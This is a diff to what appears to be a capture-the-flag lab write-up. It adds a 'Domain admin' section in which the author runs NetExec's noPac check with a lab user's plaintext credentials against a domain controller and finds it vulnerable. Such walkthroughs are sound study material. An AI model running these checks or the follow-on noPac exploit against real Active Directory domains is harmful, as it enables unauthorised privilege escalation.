@@ -363,6 +363,21 @@ RETRO2\ldapreader
 ```
 So now i should be able to RDP 
 
+# Domain admin
+Now i have access over RDP i can look for priv esc vectors
+
+```python
+nxc smb bln01.retro2.vl -u 'ldapreader' -p 'ppYaVcB5R' -M nopac                                
+SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.12.5     445    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R 
+NOPAC       10.129.12.5     445    BLN01            TGT with PAC size 1435
+NOPAC       10.129.12.5     445    BLN01            TGT without PAC size 694
+NOPAC       10.129.12.5     445    BLN01            
+NOPAC       10.129.12.5     445    BLN01            VULNERABLE
+NOPAC       10.129.12.5     445    BLN01            Next step: https://github.com/Ridter/noPac
+```
+Looks like its vulnerable to noPac
+
 
 
 
